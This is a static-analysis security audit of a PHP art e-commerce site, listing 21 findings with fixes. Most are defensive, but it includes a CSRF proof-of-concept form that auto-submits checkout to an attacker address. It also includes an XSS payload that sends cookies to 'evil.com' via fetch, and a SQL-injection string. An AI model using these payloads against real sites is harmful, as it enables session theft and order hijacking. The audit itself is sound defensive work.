# Security Audit Report

**Project:** Art & E-Commerce  
**Audit date:** 2026-06-04  
**Scope:** All PHP source files, SQL schema, configuration, and session handling  
**Auditor:** Static code analysis — full file inspection

---

## Severity Legend

| Level | Meaning |
|---|---|
| CRITICAL | Exploitable right now with no preconditions; immediate remediation required |
| HIGH | Significant risk that directly enables data theft, manipulation, or DoS |
| MEDIUM | Real vulnerability; requires specific conditions or reduces defense in depth |
| LOW | Minor weakness; hardening measure or best-practice gap |

---

## Summary

| Severity | Count |
|---|---|
| CRITICAL | 3 |
| HIGH | 6 |
| MEDIUM | 7 |
| LOW | 5 |
| **Total** | **21** |

---

## CRITICAL

---

### C-01 — Session dumped to all users in `addToCart.php`

**File:** `public/addToCart.php:29–31`

```php
echo "<pre>";
print_r($_SESSION);   // ← dumps entire session to the browser
echo "</pre>";
```

`print_r($_SESSION)` is live, uncommented code. Every time any user adds an item to their cart the full session state is rendered into the page. While the current session only contains cart data, any future session variable (e.g., a user ID, admin flag, or CSRF token) added here would immediately be visible to end users and readable by any script running in the page context.

**Fix:** Remove lines 29–31. The commented-out redirect above them is the correct replacement:

```php
header("Location: ../views/productDetails.php?id=$productId");
exit();
```

---

### C-02 — Test files publicly writable by anyone

**Files:** `public/testCustomer.php`, `public/testPurchase.php`, `public/testPurchaseItem.php`, `public/testConnection.php`

These files are deployed in the publicly-accessible `public/` directory. Any visitor can hit them directly in a browser:

| File | Effect on every request |
|---|---|
| `testConnection.php` | Confirms the database is live (reconnaissance) |
| `testCustomer.php` | **Creates a new `Customers` row** with hardcoded data |
| `testPurchase.php` | **Creates a new `Purchases` row** (CustomerID = 2, hardcoded) |
| `testPurchaseItem.php` | **Creates a new `PurchaseItem` row** (PurchaseID = 2, ProductID = 1, Qty = 3) |

An attacker can loop these URLs to flood the database with garbage records. `testCustomer.php` alone will increment `CustomerID` on every hit, consuming auto-increment space and polluting any order history view.

**Fix:** Delete all four files before any deployment:

```bash
rm public/testConnection.php public/testCustomer.php \
   public/testPurchase.php public/testPurchaseItem.php
```

If they must be kept for development, gate them behind an IP check or move them outside the web root entirely.

---

### C-03 — No CSRF protection on the checkout form

**Files:** `views/checkout.php:18`, `public/processCheckout.php`

The checkout form posts directly to `processCheckout.php` with no token:

```html
<form method="POST" action="../public/processCheckout.php">
```

An attacker can host a page like this:

```html
<form method="POST" action="https://victim-site/public/processCheckout.php" id="f">
  <input name="email"     value="attacker@evil.com">
  <input name="firstName" value="Evil">
  <input name="address"   value="Attacker Street">
  ...
</form>
<script>document.getElementById('f').submit();</script>
```

If a user with items in their session cart visits this page, their cart is checked out and the order ships to the attacker's address. This is a complete purchase hijack requiring zero credentials.

**Fix — generate and verify a synchroniser token:**

```php
// In views/checkout.php (after session_start):
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
```

```html
<input type="hidden" name="csrf_token"
       value="<?php echo $_SESSION['csrf_token']; ?>">
```

```php
// Top of processCheckout.php:
if (!isset($_POST['csrf_token'], $_SESSION['csrf_token'])
    || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    http_response_code(403);
    exit("Invalid request.");
}
unset($_SESSION['csrf_token']);
```

---

## HIGH

---

### H-01 — Database credentials committed to source control

**File:** `config/database.php:8–10`

```php
private $username = "root";
private $password = "";
```

The root MySQL account with no password is hardcoded in a tracked file. The `.gitignore` does **not** exclude `config/database.php`. If this repository is pushed to GitHub (public or private with shared access), credentials are exposed in the commit history permanently — even if the file is later changed.

**Additional risk:** Using `root` means the PHP application has unrestricted access to all MySQL databases on the server, not just `ecommerce_db`. A successful SQL injection would have full server-level database access.

**Fix:**

1. Create a dedicated MySQL user with minimal permissions:
   ```sql
   CREATE USER 'artapp'@'localhost' IDENTIFIED BY 'StrongPasswordHere';
   GRANT SELECT, INSERT, UPDATE, DELETE ON ecommerce_db.* TO 'artapp'@'localhost';
   ```

2. Use environment variables instead of hardcoded values:
   ```php
   private $username = $_ENV['DB_USER'];
   private $password = $_ENV['DB_PASS'];
   ```

3. Add `config/database.php` to `.gitignore` and rotate the credentials if the repo has ever been pushed publicly.

---

### H-02 — Database error messages exposed to users

**File:** `config/database.php:33`

```php
} catch(PDOException $e) {
    echo "Connection Error: " . $e->getMessage();
}
```

A PDO connection exception message typically contains:

```
Connection Error: SQLSTATE[HY000] [1045] Access denied for user 'root'@'localhost' (using password: NO)
```

This reveals the database username, hostname, authentication method, and MySQL error code to any visitor when the database is unreachable. An attacker who can trigger a connection failure (e.g., by exhausting connections) gets a free reconnaissance report.

**Fix:**

```php
} catch(PDOException $e) {
    error_log("DB connection failed: " . $e->getMessage()); // server log only
    http_response_code(503);
    exit("Service temporarily unavailable.");
}
```

---

### H-03 — Stored XSS via unescaped database output

**Files:** `views/products.php:29,33,37`, `views/productDetails.php:22,27,29,33,35`, `views/home.php:54,58,62`

No database-sourced value is passed through `htmlspecialchars()` before output. Representative examples:

```php
// views/products.php
echo $row['Title'];        // line 29 — unescaped
echo $row['Description'];  // line 33 — unescaped

// views/productDetails.php
echo $row['Title'];        // line 22 — rendered inside <title> tag
echo $row['Image'];        // line 35 — echoed raw into <p> tag

// views/productDetails.php — hidden input
value="<?php echo $row['ProductID']; ?>"  // line 46
```

If a product record contains `<script>alert(document.cookie)</script>` in its `Title` or `Description`, that script executes in every visitor's browser. This is **stored XSS**: a single poisoned database row affects all users viewing that product.

The `Image` column is especially risky — if set to `"><script>fetch('https://evil.com?c='+document.cookie)</script>`, it would fire on every product detail page load.

**Fix — apply `htmlspecialchars()` to every echoed value:**

```php
// Define a helper once, use everywhere:
function e(string $s): string {
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

echo e($row['Title']);
echo e($row['Description']);
echo e($row['Image']);
```

---

### H-04 — Debug output leaks internal IDs and processing flow

**File:** `public/processCheckout.php:16,31,49,59,74`

```php
echo "Models Loaded Successfully";
echo "POST Data Retrieved";
echo "Customer Created: " . $customerId;
echo "Purchase Created: " . $purchaseId;
echo "Purchase Items Created";
```

These are live debug statements visible to all users. They expose:

- Confirmation that the checkout pipeline executed (maps internal flow to attacker)
- The `CustomerID` assigned — a sequential auto-increment integer that reveals total customer volume
- The `PurchaseID` — reveals total order volume

An attacker visiting the checkout once with a dummy order learns the approximate number of customers and orders in the system.

**Fix:** Remove all five echo debug lines. The final success message is sufficient:

```php
echo "<h1>Order Successfully Placed!</h1>";
echo "<p>Your Purchase ID is: " . (int)$purchaseId . "</p>";
```

---

### H-05 — No server-side input validation on checkout POST

**File:** `public/processCheckout.php:20–29`

```php
$email    = $_POST['email'];
$firstName = $_POST['firstName'];
// ... 8 more fields read directly
```

All ten POST fields are read and passed to the database with zero server-side validation. HTML `required` attributes are the only guard, and they are trivially bypassed with a crafted request (`curl -X POST ...`). Consequences:

- An empty string satisfies the PHP code and goes straight to the INSERT
- `email` can receive non-email strings like `abc` or `'; DROP TABLE Customers; --` (prepared statements neutralise the SQL risk, but the data quality is garbage)
- No max-length enforcement — a 10,000-character `firstName` will be truncated silently by MySQL but could cause unexpected behaviour
- Cart `$quantity` values are read directly from the session without verifying they are positive integers; a tampered session could submit `quantity = 0` or `quantity = -1`

**Fix — validate before use:**

```php
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
if (!$email) { http_response_code(400); exit("Invalid email."); }

$firstName = trim($_POST['firstName'] ?? '');
if (strlen($firstName) < 1 || strlen($firstName) > 50) {
    http_response_code(400); exit("Invalid first name.");
}

foreach ($_SESSION['cart'] as $productId => $quantity) {
    if (!ctype_digit((string)$productId) || (int)$quantity < 1) {
        http_response_code(400); exit("Invalid cart data.");
    }
}
```

---

### H-06 — Checkout creates records with an empty cart

**File:** `public/processCheckout.php:34–46,63–71`

`processCheckout.php` creates a `Customer` row and a `Purchases` row unconditionally, then loops the cart. If a user submits the checkout form with an empty cart (session expired, direct POST, etc.), the result is:

- A `Customers` row is written
- A `Purchases` row is written
- The cart loop does nothing
- The database contains a purchase with no items

An attacker can create unlimited orphaned purchase records by repeatedly POSTing to this endpoint.

**Fix — abort early if cart is empty:**

```php
session_start();
if (empty($_SESSION['cart'])) {
    http_response_code(400);
    exit("Cart is empty.");
}
```

---

## MEDIUM

---

### M-01 — No authentication or access control

The entire application has no authentication layer. There are no user accounts and no session-based login. Every page — including the checkout confirmation page that reveals a `PurchaseID` — is publicly accessible.

While this is an intentional design decision for this version, it means:

- There is no way to restrict admin functions (if added later)
- There is no concept of "my orders" vs. "someone else's orders"
- The `PurchaseID` shown at checkout is guessable (sequential integers)

**Fix:** For a guest-checkout model, no auth is required, but order confirmation should require the session to contain the just-created `$purchaseId` rather than echoing it from a publicly-accessible handler.

---

### M-02 — Session cookies not hardened

No session configuration is applied before `session_start()` is called in any file. Default PHP session settings leave cookies vulnerable:

| Flag | Default | Risk if missing |
|---|---|---|
| `httponly` | Often `0` | Session cookie readable by JavaScript — exploitable via XSS (H-03) |
| `secure` | `0` | Cookie sent over plain HTTP — readable by network observer |
| `samesite` | `''` | Cookie sent on cross-site requests — worsens C-03 CSRF risk |

**Fix — configure before the first `session_start()` call:**

```php
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'secure'   => true,       // HTTPS only
    'httponly' => true,       // no JS access
    'samesite' => 'Strict',   // blocks cross-site submission
]);
session_start();
```

---

### M-03 — No session fixation protection

`session_start()` is called without regenerating the session ID at any privilege boundary (e.g., when the cart transitions from empty to containing items, or at checkout). A session fixation attack lets an attacker pre-set a victim's session ID, then use that same ID after the victim has populated their cart.

**Fix — regenerate the session ID on state change:**

```php
// In addToCart.php, after the first item is added to an empty cart:
if (empty($_SESSION['cart'])) {
    session_regenerate_id(true);
}

// In processCheckout.php, before processing:
session_regenerate_id(true);
```

---

### M-04 — No HTTP security headers

No security-relevant HTTP headers are set anywhere. Missing headers enable several attack classes:

| Header | Attack it prevents |
|---|---|
| `Content-Security-Policy` | XSS script injection |
| `X-Frame-Options: DENY` | Clickjacking |
| `X-Content-Type-Options: nosniff` | MIME sniffing |
| `Referrer-Policy: no-referrer` | URL leakage in referrer |
| `Strict-Transport-Security` | SSL stripping |

**Fix — add to a shared header file included on every page, or via Apache/Nginx config:**

```php
header("Content-Security-Policy: default-src 'self'");
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("Referrer-Policy: no-referrer");
```

---

### M-05 — `database/` directory is potentially web-accessible

The `database/` directory sits at the project root. If the document root is set to the project root (rather than `public/`), the following files are directly downloadable:

- `database/create.sql` — reveals the full schema
- `database/load.sql` — reveals sample data, table structure, and the admin insert patterns
- `database/test.sql` — reveals test queries

An attacker who downloads the schema knows every table name, column name, and data type, and can craft targeted attacks.

**Fix:**

Option A — move the document root to a `public/` subdirectory so only files under `public/` are web-accessible.

Option B — add a `.htaccess` to `database/`:

```apache
Require all denied
```

---

### M-06 — `config/` directory is potentially web-accessible

Same problem as M-05. `config/database.php` under a badly-configured server root could be served as plain text, exposing credentials. PHP files are normally executed rather than served, so the exploit requires a misconfigured PHP handler — but it is a real risk on shared hosting.

**Fix:** Move the document root to `public/`, keeping `config/`, `models/`, `controllers/`, and `views/` above the web root so they cannot be directly requested.

---

### M-07 — Predictable sequential Purchase IDs

`PurchaseID` is auto-increment and exposed directly to the user:

```php
echo "<p>Your Purchase ID is: " . $purchaseId . "</p>";
```

An attacker who places one order and receives `PurchaseID = 47` knows approximately 47 orders have been placed. By tracking changes over time they can estimate order volume. Sequential IDs also open the door for enumeration if order details are ever served by ID.

**Fix:** Use a non-sequential order reference — either a UUID or a hash:

```php
$orderRef = strtoupper(substr(bin2hex(random_bytes(4)), 0, 8));
// e.g., "A3F9C21B" instead of "47"
```

Store this as an additional `OrderRef VARCHAR(16)` column in `Purchases`.

---

## LOW

---

### L-01 — No HTTPS enforcement

Checkout (`views/checkout.php`) collects full name, address, phone number, and email over a plain HTTP connection if the server is not configured for HTTPS. There is no server-side redirect from HTTP to HTTPS.

**Fix:** Configure Apache/Nginx to redirect all HTTP traffic to HTTPS, and add HSTS (see M-04).

---

### L-02 — `$_GET['id']` used without any type check

**File:** `views/productDetails.php:8`

```php
$id = $_GET['id'];
```

`$id` is passed directly to `getArtworkByID($id)`. While the prepared statement prevents SQL injection, there is no check that `id` is a positive integer. A request to `productDetails.php?id=0` or `productDetails.php?id=abc` will execute the query and then attempt to access `$row['Title']` on a `null` result, causing an undefined index PHP warning (which may be logged or displayed depending on server config).

**Fix:**

```php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT, ['options' => ['min_range' => 1]]);
if (!$id) { http_response_code(404); exit("Product not found."); }
```

---

### L-03 — No cart item quantity limit

Cart quantity is incremented by `$_SESSION['cart'][$productId]++` with no upper bound. A script that calls `addToCart.php` in a loop can push a cart item to an arbitrarily high quantity, which then gets committed to `PurchaseItem.Quantity` at checkout. No business rule enforces a maximum order quantity.

**Fix:**

```php
$max = 99;
if ($_SESSION['cart'][$productId] < $max) {
    $_SESSION['cart'][$productId]++;
}
```

---

### L-04 — `.gitignore` does not protect sensitive files

**File:** `.gitignore`

Current contents:

```
.vccode/
.DS_Store
Thumbs.db
```

`config/database.php`, `.env` files, and any future secrets file are not excluded. All credentials will be tracked and pushed to any remote.

**Fix — extend `.gitignore`:**

```
# IDE
.vscode/
.DS_Store
Thumbs.db

# Credentials
config/database.php
.env
.env.*

# Database exports
*.sql.bak
database/ecommerce_db/
```

---

### L-05 — `Title` value in `checkout.php` does not match database ENUM

**File:** `views/checkout.php:32–36`

The dropdown for `Title` includes:

```html
<option>Mx</option>
```

The database ENUM is `ENUM("Mr.","Mrs.","Mx.","Ms.")` — note `"Mx."` with a trailing period. Selecting "Mx" submits a value that does not match any ENUM member. MySQL will silently insert an empty string `''` (in non-strict mode) or throw an error (in strict mode), corrupting the `Title` field.

**Fix:**

```html
<option value="Mx.">Mx.</option>
```

---

## Findings by File

| File | Findings |
|---|---|
| `config/database.php` | H-01, H-02 |
| `public/addToCart.php` | C-01 |
| `public/processCheckout.php` | C-03, H-04, H-05, H-06 |
| `public/testConnection.php` | C-02 |
| `public/testCustomer.php` | C-02 |
| `public/testPurchase.php` | C-02 |
| `public/testPurchaseItem.php` | C-02 |
| `views/products.php` | H-03 |
| `views/productDetails.php` | H-03, L-02 |
| `views/home.php` | H-03 |
| `views/cart.php` | H-03 |
| `views/checkout.php` | C-03, L-05 |
| `database/create.sql` | M-05 |
| `database/load.sql` | M-05 |
| `.gitignore` | H-01, L-04 |
| All session files | M-02, M-03 |
| Project-wide | M-01, M-04, M-06, M-07, L-01, L-03 |

---

## Remediation Priority

| Priority | Action | Finding |
|---|---|---|
| **1** | Remove `print_r($_SESSION)` and enable the redirect in `addToCart.php` | C-01 |
| **2** | Delete all `public/test*.php` files | C-02 |
| **3** | Add CSRF token to checkout form and verify in handler | C-03 |
| **4** | Replace root/no-password DB credentials with a least-privilege user | H-01 |
| **5** | Silence PDO exceptions; log to file only | H-02 |
| **6** | Wrap all echoed DB values in `htmlspecialchars()` | H-03 |
| **7** | Remove all debug `echo` statements from `processCheckout.php` | H-04 |
| **8** | Add server-side validation to checkout POST handler | H-05 |
| **9** | Abort checkout if cart is empty | H-06 |
| **10** | Harden session cookie flags | M-02 |
| **11** | Add session ID regeneration at state transitions | M-03 |
| **12** | Move document root to `public/` or deny access to `database/` and `config/` | M-05, M-06 |
| **13** | Add security HTTP headers | M-04 |
| **14** | Add integer validation to `$_GET['id']` | L-02 |
| **15** | Fix `Mx` → `Mx.` in checkout dropdown | L-05 |
| **16** | Extend `.gitignore` | L-04 |
